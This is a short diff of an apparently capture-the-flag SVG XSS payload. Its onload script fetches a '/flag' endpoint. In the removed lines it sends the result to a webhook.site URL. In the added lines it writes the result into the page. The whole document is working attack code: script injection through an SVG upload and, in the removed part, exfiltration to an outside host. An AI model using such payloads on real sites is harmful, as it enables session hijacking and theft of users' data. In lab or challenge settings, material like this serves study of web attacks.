@@ -1,7 +1,10 @@
 <svg xmlns="http://www.w3.org/2000/svg" onload="
   fetch('/flag')
     .then(r => r.text())
-    .then(flag => {
-      fetch('https://webhook.site/f6c3e79a-49e9-40c2-83bd-58943012dab8?flag=' + encodeURIComponent(flag))
+    .then(f => {
+      let el = document.createElement('div');
+      el.innerText = f;
+      el.style = 'font-size:2em;color:red';
+      document.body.appendChild(el);
     });
 "></svg>
